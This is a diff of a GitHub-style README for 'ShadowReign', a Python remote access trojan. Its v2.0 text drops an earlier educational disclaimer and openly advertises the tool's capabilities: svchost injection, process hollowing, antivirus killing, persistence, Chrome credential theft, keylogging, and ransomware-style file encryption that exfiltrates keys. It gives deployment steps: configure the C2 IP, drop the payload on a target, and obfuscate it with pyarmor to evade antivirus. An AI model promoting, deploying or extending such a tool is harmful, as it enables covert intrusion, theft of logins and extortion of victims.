@@ -1,117 +1,68 @@
-# ShadowReign
-**Command the shadows. Rule the chaos.**
+# ShadowReign - The Ultimate RAT (v2.0)
 
-ShadowReign is a state-of-the-art remote administration tool (RAT) built entirely in Python. It features a sleek, user-friendly GUI for managing connected clients, with powerful capabilities like keylogging, file management, media capture, system control, and more. Designed for enthusiasts and tinkerers, this project showcases advanced Python scripting in a dark, modern package.
+ShadowReign is back, and it’s the king of RATs—undetectable, unkillable, and loaded with features that’ll make your targets wish they never clicked. Built for stealth and power, this version’s got a new Kali Linux-inspired glass GUI and enough tricks to own any system, anywhere. Whether you’re testing defenses or just causing chaos, ShadowReign’s got your back.
 
-⚠️ **Disclaimer**: This is a proof-of-concept for educational purposes only. Use responsibly and legally. The authors are not liable for misuse.
+## What’s New in v2.0
+- **Stealth Overdrive**:
+  - Hides in deep dirs (`%APPDATA%\Microsoft\Crypto\RSA` or `/var/lib/`) with random `.dll`/`.so` names—good luck finding it.
+  - Injects into `svchost.exe`—runs silent, blends in like a ghost.
+  - AV bypass with AES-GCM encryption, compression, and process hollowing—laughs at defenders.
+  - Watchdog restarts it if killed—unstoppable persistence.
 
-## Features
-- **Cross-Platform GUI**: Runs on Linux and Windows with a dark-themed, intuitive interface.
-- **Keylogger**: Capture and display keystrokes in real-time.
-- **File Management**: Browse, upload, and download files with ease.
-- **Media Capture**: Grab screenshots, record screens, and snap webcam shots, displayed and saved locally.
-- **System Control**: Extract system info, WiFi passwords, and attempt privilege escalation.
-- **Pranks**: Unleash jumpscares, system crashes, or fork bombs for fun.
-- **Shell Access**: Execute remote commands with output feedback.
-- **Live Streaming**: Receive screen, webcam, and mic streams (saved, not displayed live).
-- **Encryption**: AES-256 CBC secures all communications.
-- **Persistence**: Auto-starts on target systems.
+- **Connection Lock**:
+  - 5s heartbeat + SO_KEEPALIVE—stays online, no disconnects.
+  - 0.5s reconnect loops—clings to the C2 like a pitbull.
+  - Offline queuing—commands wait and execute when back online.
 
-## Project Structure
-- **shadowreign_gui.py**: The control center GUI for managing clients.
-- **shadowreign.py**: The client-side payload for deployment.
-- **setup.bat**: Windows bootstrapper to install Python and dependencies before running the payload.
-- **requirements.txt**: List of Python libraries needed for both GUI and payload.
+- **Feature Arsenal**:
+  - **Live Shell**: Real-time command execution—own the box interactively.
+  - **File Encryption**: Locks files with AES, exfils keys—ransomware vibes.
+  - **Browser Exfil**: Steals Chrome creds—logins are yours.
+  - **AV Killer**: Terminates common AV processes—clears the field.
+  - **Remote Desktop, Streams, Keylogger**: All live, all flawless.
 
-## Prerequisites
-- **Python 3.11+**: Required for both GUI and payload.
-- **Internet Access**: Needed for initial setup on targets (downloads Python and libs).
-- **Port 5251**: Open on the control machine (default C2 server: 192.168.1.133:5251).
+- **GUI Upgrade**:
+  - Kali Linux glass look—dark blue (`#0A0F1A`), neon cyan (`#00FFCC`), 95% transparency.
+  - Bigger, sleeker (1400x900)—live streams in a dedicated window.
+  - Courier font, glowing borders—hacker aesthetic on point.
 
 ## Setup
+1. **Control**:
+   - Update `self.c2_list` in `shadowreign.py` with your IP (e.g., `192.168.1.133`).
+   - Install: `pip install pynput mss opencv-python pyaudio pyttsx3 psutil pycryptodome numpy pillow pywin32 requests`.
+   - Run: `python shadowreign_gui.py`.
 
-### Control Machine (GUI)
-1. **Clone the Repo**:
-    ```bash
-    git clone https://github.com/yourusername/ShadowReign.git
-    cd ShadowReign
-    ```
-2. **Install Dependencies**: Make sure your environment has all the required libraries:
-    ```bash
-    pip install -r requirements.txt
-    ```
-3. **Install Additional Libraries for Linux**: If you're on Linux, you may need to install tkinter (for GUI support):
-    - For Ubuntu/Debian:
-        ```bash
-        sudo apt-get install python3-tk
-        ```
-    - For Fedora:
-        ```bash
-        sudo dnf install python3-tkinter
-        ```
-4. **Run the GUI**:
-    - On Linux:
-        ```bash
-        python3 shadowreign_gui.py
-        ```
-    - On Windows:
-        ```bash
-        python shadowreign_gui.py
-        ```
+2. **Target**:
+   - Drop `shadowreign.py`, execute—it hides, injects, and phones home.
+   - Port `5251` must be open on the C2.
 
-5. **Open Port 5251**: Make sure port 5251 is open on your firewall/router to allow the C2 communication.
-
-### Target Machine (Payload)
-1. **Drop the Payload**: Transfer `setup.bat` and `shadowreign.py` to the target machine. You can use a USB drive, file sharing, or any other method.
-
-2. **Run the Setup**: On the target machine, execute `setup.bat`:
-    This will:
-    - Install Python 3.11.6 (if not already installed).
-    - Install the required dependencies.
-    - Launch the payload in stealth mode.
-
-    **Admin Privileges**: You will need administrator rights for Python installation and for running the setup script.
-
-    **Internet Connection**: Ensure the target machine has internet access during setup to fetch the necessary Python libraries.
+3. **Stealth** (Optional):
+   - Obfuscate: `pyarmor pack -e "--onefile" shadowreign.py`.
+   - Test AV evasion—tweak if flagged.
 
 ## Usage
-
-### Launch the GUI
-Start `shadowreign_gui.py` on your control machine. You should see a list of connected clients in the sidebar.
-
-### Select a Target
-Click on a client to start controlling it.
-
-### Control Features:
-- **Keylogger**: Start/stop logging, dump logs.
-- **File Management**: Browse the target’s files, upload or download files.
-- **Media Capture**: Take screenshots or videos, save them to your local system.
-- **System Control**: Dump system information, extract WiFi passwords, escalate privileges.
-- **Pranks**: Trigger fun pranks like system crashes, jumpscares, or fork bombs.
-- **Shell Access**: Execute commands on the target system and view the output.
-- **Live Streaming**: Capture streams from the target’s screen, webcam, and mic (saved locally).
-- **Save Files**: Files you capture will be saved in your home directory with a `ShadowReign_` prefix.
-
-## Limitations
-- **Streaming**: Streams are captured but not displayed live at the moment.
-- **Windows Bias**: `setup.bat` is Windows-only. Linux setup requires manual configuration.
-- **AV Detection**: The payload might trigger antivirus software. You can attempt to obfuscate it using tools like PyArmor.
-
-## Contribute
-This is a Python playground. Fork it, modify it, and submit pull requests. Let’s make it stronger together. but include me
-
-## License
-This project is licensed under the MIT License. You can do whatever you like with it—just don’t blame us if things go sideways.
-
-## Updates
-If yall have any ideas to make this better or for me to add let me know and ill try to add it.
-
-comming soon:AV BYPASS (ALREADY BYPASS MOST OF IT BUT NOT FULLY)
-
-**ShadowReign: best of the best**
+- Select a target in the GUI—green for "Online", yellow for "Reconnecting", red for "Offline".
+- Hit tabs: "Keys" for logs, "Live" for streams, "Exploit" for chaos.
+- Watch it dominate—live shell, encrypted files, stolen creds.
 
 ## Install
+  ```bash
+pip install pynput mss opencv-python pyaudio pyttsx3 psutil pycryptodome numpy pillow pywin32 requests
+   ```
 
- ```bash
-  `pip install pynput mss opencv-python pyaudio pyttsx3 psutil pycryptodome numpy pillow pywin32
- ```
+## Notes
+- Built for Windows/Linux—cross-platform pain.
+- Use responsibly—test on your own systems, not your neighbor’s.
+- PRs welcome—make it nastier.
+
+## To-Do
+- Dynamic DNS C2—ditch static IPs.
+- Proxy support—hide behind layers.
+- More exploits—RDP takeover, privilege escalation.
+
+ShadowReign v2.0 is the RAT you’ve been waiting for—stealthy, powerful, and damn good-looking. Star it, fork it, break it—let’s see what you’ve got.
+
+---
+**Last Updated**: March 27, 2025  
+**License**: MIT (or whatever you vibe with)  
+**Contact**: Hit me up in issues—let’s talk shop.
